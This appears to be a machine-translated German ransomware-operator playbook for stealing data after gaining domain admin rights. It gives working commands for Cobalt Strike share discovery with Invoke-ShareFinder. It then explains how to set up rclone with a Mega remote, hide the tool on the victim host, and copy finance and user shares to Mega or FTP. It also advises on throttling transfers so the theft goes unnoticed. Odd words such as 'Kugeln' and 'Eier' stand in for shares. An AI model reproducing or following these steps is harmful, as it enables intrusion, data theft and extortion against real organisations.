1) Nachdem wir die Rechte erhöht und die Admin-Domäne gefunden haben, ziehen wir die Sitzungen in die Kobalt
2)Setzen Sie die JA-Marke auf und entfernen Sie die Kugeln auf diese Weise : 
    *powershell-import - Laden Sie ShareFinder wie gewohnt hoch und geben Sie dem Raum die folgenden Informationen - 
psinject 7080 x64 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt

Bei der Untersuchung der entfernten Kugeln interessiert uns nun Folgendes 
*Finanzdocks
*Buchhaltung
*Aichi
*Kunden
*Projekte 
Und so weiter, es hängt alles davon ab, was unser Ziel tut

Als Nächstes gehen Sie wie folgt vor > Hier ist das Diablo-Handbuch, das leicht zu verstehen und zu befolgen ist 

Rclone
Um das Herunterladen über den Klon zu starten, muss eine Konfiguration erstellt werden
Um eine Konfiguration zu erstellen, öffnen Sie cmd und gehen Sie in das Verzeichnis, in dem sich rclone.exe befindet
rclone.exe mit dem Befehl: rclone config ausführen
Wählen Sie dann im angezeigten Menü die Option Neue Fernbedienung
mega nennen und dann wieder mega eingeben 
Geben Sie dann die Mega-Mail-Adresse ein, und Sie werden aufgefordert, Ihr Kennwort einzugeben oder zu generieren, also wählen wir "Y". 
der Pass wird beim Einfügen nicht angezeigt, aber er wird trotzdem eingefügt
nach dem Erstellen einer Konfiguration kehren wir zum Hauptmenü zurück und beenden den rclone.
Geben Sie dann den Befehl rclone.exe config show ein, der die von uns erstellte Konfiguration anzeigt
kopieren wir sie und erstellen eine Datei rclone.conf, in die wir diese Informationen eintragen.
Nachdem wir die Ballons gefunden haben, an denen wir interessiert sind, laden wir die Exe und die Config auf den Zielrechner hoch, wobei wir die Rechte haben, die Config und die Exe zu verstecken, damit sie nicht gefunden werden
gehen Sie in das Verzeichnis der exe-Datei und geben Sie den Befehl: shell rclone.exe copy "\\envisionpharma.com\IT\KLSHARE" Mega:Finanse -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
wo: \envisionpharma.com\IT\KLSHARE sind die Eier  
Mega:Finanse den Speicherort der Dateien in der Mega (kann einen eigenen Ordner in der Mega erstellen, indem er hier angegeben wird)
streams 12 --transfers 12 dies ist die Anzahl der Ströme, die maximal pumpen (12) Ich empfehle es nicht, weil man leicht erwischt werden kann 



shell rclone.exe copy "\\PETERLENOVO.wist.local\Users" ftp1:uploads/Users/ -q --ignore-existing --auto-confirm --multi-thread-streams 3 --transfers 3  - Hier ist ein Beispiel für diesen Fall auf dem FTP

!!! DER KLON SELBST WIEGT CA. 50MB, DER LINK DAZU WIRD UNTER DEM POSTING STEHEN!!!